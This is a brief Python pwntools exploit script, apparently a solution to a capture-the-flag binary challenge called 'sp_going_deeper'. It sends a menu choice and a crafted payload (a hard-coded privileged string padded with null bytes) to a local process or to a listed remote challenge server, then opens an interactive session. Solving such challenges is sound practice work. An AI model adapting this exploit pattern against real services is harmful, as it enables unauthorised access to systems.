#!/usr/bin/env python3
#19-06-2022
#Gon

from pwn import *
exe = ELF('./sp_going_deeper')

context.binary = exe
context.log_level='info'

offset = 56


def conn():
    if args.REMOTE:
        io = remote('138.68.139.197', 30297)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

io = conn()

payload = flat([
                b'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00\x00\x00\x00\x00',
                ])
write('payload', payload)

io.sendlineafter(b'>> ', b'1')
io.sendafter(b': ', payload)
print(io.recvline())
io.interactive()
